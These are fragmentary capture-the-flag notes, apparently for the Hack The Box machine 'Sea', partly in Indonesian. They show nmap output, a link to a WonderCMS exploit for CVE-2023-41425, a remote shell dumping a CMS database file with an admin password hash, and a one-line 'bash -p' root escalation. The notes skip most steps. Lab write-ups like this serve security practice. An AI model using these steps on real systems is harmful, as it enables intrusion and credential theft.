
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e3:54:e0:72:20:3c:01:42:93:d1:66:9d:90:0c:ab:e8 (RSA)
|   256 f3:24:4b:08:aa:51:9d:56:15:3d:67:56:74:7c:20:38 (ECDSA)
|_  256 30:b1:05:c6:41:50:ff:22:a3:7f:41:06:0e:67:fd:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Sea - Home
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```


url:
http://sea.htb/themes/bike/LICENSE

search keyword di google turboblack velik71 cms, maka akan muncul hasil https://www.wondercms.com/community/viewtopic.php?t=830

cve: [https://github.com/prodigiousMind/CVE-2023-41425](https://github.com/prodigiousMind/CVE-2023-41425)

```bash
(remote) www-data@sea:/var/www/sea/data$ cat database.js
{
    "config": {
        "siteTitle": "Sea",
        "theme": "bike",
        "defaultPage": "home",
        "login": "loginURL",
        "forceLogout": false,
        "forceHttps": false,
        "saveChangesPopup": false,
        "password": "$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q",
        "lastLogins": {
            "2024\/08\/11 01:41:17": "127.0.0.1",
            "2024\/08\/11 01:40:17": "127.0.0.1",
            "2024\/08\/11 01:39:17": "127.0.0.1",
            "2024\/08\/11 01:39:16": "127.0.0.1",
            "2024\/08\/11 01:38:16": "127.0.0.1"
        },
        "lastModulesSync": "2024\/07\/31",
        "customModules": {
            "themes": {},
            "plugins": {}
        },
        "menuItems": {
            "0": {
                "name": "Home",
                "slug": "home",
                "visibility": "show",
                "subpages": {}
            },
            "1": {
                "name": "How to participate",
                "slug": "how-to-participate",
                "visibility": "show",
                "subpages": {}
            }
        },
        "logoutToLoginScreen": {}
    },
    "pages": {
        "404": {
            "title": "404",
            "keywords": "404",
            "description": "404",
            "content": "<center><h1>404 - Page not found<\/h1><\/center>",
            "subpages": {}
        },
        "home": {
            "title": "Home",
            "keywords": "Enter, page, keywords, for, search, engines",
            "description": "A page description is also good for search engines.",
            "content": "<h1>Welcome to Sea<\/h1>\n\n<p>Hello! Join us for an exciting night biking adventure! We are a new company that organizes bike competitions during the night and we offer prizes for the first three places! The most important thing is to have fun, join us now!<\/p>",
            "subpages": {}
        },
        "how-to-participate": {
            "title": "How to",
            "keywords": "Enter, keywords, for, this page",
            "description": "A page description is also good for search engines.",
            "content": "<h1>How can I participate?<\/h1>\n<p>To participate, you only need to send your data as a participant through <a href=\"http:\/\/sea.htb\/contact.php\">contact<\/a>. Simply enter your name, email, age and country. In addition, you can optionally add your website related to your passion for night racing.<\/p>",
            "subpages": {}
        }
    },
    "blocks": {
        "subside": {
            "content": "<h2>About<\/h2>\n\n<br>\n<p>We are a company dedicated to organizing races on an international level. Our main focus is to ensure that our competitors enjoy an exciting night out on the bike while participating in our events.<\/p>"
        },
        "footer": {
            "content": "©2024 Sea"
        }
    }
}(remote) www-data@sea:/var/www/sea/data$ 
```


**root :**
```bash
/usr/bin/bash -p
```
